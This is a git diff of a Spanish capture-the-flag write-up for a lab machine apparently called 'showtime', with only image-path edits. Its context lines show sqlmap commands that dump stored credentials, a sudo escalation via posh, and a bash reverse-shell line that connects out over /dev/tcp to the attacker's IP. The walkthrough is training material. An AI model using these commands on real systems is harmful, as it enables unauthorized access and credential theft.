@@ -4,13 +4,13 @@
 
 Iniciamos haciendo un escaneo de nmap con el siguiente comando "nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2"
 
-![nmap](../../../maquina-showtime/imagenes/nmap.png)
+![nmap](./images/showtime/imagenes/nmap.png)
 
 Vemos que el puerto 80 y 22 están abiertos, así que exploraremos el puerto 80.
 
 Puerto 80:
 
-![Puerto 80](../../../maquina-showtime/imagenes/puerto80.png)
+![Puerto 80](./images/showtime/imagenes/puerto80.png)
 
 Lo mas interesante que vemos es el botón de login, así que lo presionamos y nos redirecciona a un panel de login.
 
@@ -20,11 +20,11 @@ Luego de intentar con credenciales tipicas como "admin:admin", "root:root" y ver
 
 sqlmap encuentra lo siguiente:
 
-![sqlmap](../../../maquina-showtime/imagenes/sqlmap.png)
+![sqlmap](./images/showtime/imagenes/sqlmap.png)
 
 Ahora vamos a listar las bases de datos con "sqlmap -u "http://172.17.0.2/login\_page/index.php" --forms --batch --dbs" nos encuentra una llamada 'users', luego vemos las tablas de esa base de datos con "sqlmap -u "http://172.17.0.2/login\_page/index.php" --forms --batch -D users --tables" y nos muestra una tabla llamada 'usuarios'. Ahora veremos que contiene con "sqlmap -u "http://172.17.0.2/login\_page/index.php" --forms --batch -D users -T usuarios --dump". Nos encuentra tres usuarios y vemos que sus contraseñas estan guardadas de manera insegura en texto.
 
-![usuarios](../../../maquina-showtime/imagenes/usuarios.png)
+![usuarios](./images/showtime/imagenes/usuarios.png)
 
 Ahora pruebo en el login uno por uno y el mas interesante es el usuario 'joe' que tiene un panel para ejecutar codigo de python. Lo primero que se me ocurre es subir un archivo .php que nos permita enviarnos una reverse shell. Pero primero debemos crearnos la reverse shell en nuestra maquina local con el siguiente codigo en su interior:
 
@@ -90,7 +90,7 @@ una vez que lo tenemos en minusculas nos lo pasamos a la maquina victima e inten
 
 Como tenemos la contraseña de joe podemos ejecutar sudo -l para ver si podemos ejecutar algo con sudo
 
-![joe-l](../../../maquina-showtime/imagenes/joe-l.png)
+![joe-l](./images/showtime/imagenes/joe-l.png)
 
 Vemos que lo unico que podemos ejecutar es "/bin/posh" como el usuario "luciano". Luego de buscar en [gtfobins](https://gtfobins.github.io/gtfobins/posh/#sudo) vemos que se puede escalar con "posh" usando:
 
@@ -102,7 +102,7 @@ sudo -u luciano posh
 
 Ya en el perfil de luciano ponemos "bash" para tener un terminal mas comodo, y nuevamente "sudo -l". Vemos que luciano puede ejecutar como root lo siguiente:
 
-![luciano-l](../../../maquina-showtime/imagenes/luciano-l.png)
+![luciano-l](./images/showtime/imagenes/luciano-l.png)
 
 Vamos al path del script usando "cd" y vemos que contiene. Al fijarnos vemos que parece tener un script para enviar una reverse shell, por lo que intentaremos modificarlo. Pero como no existe el binario nano ni vim tendremos que hacerlo con el comando "echo" de la siguiente manera:
 
@@ -112,6 +112,6 @@ echo -e '#!/bin/bash\n\nbash -c '"'"'exec 5<>/dev/tcp/(nuestra ip)/443; cat <&5 
 
 Ya solo nos queda ponernos en escucha con netcat y ejecutar el script como root y listo.
 
-![ROOT](../../../maquina-showtime/imagenes/ROOT.png)
+![ROOT](./images/showtime/imagenes/ROOT.png)
 
 Ya somos root
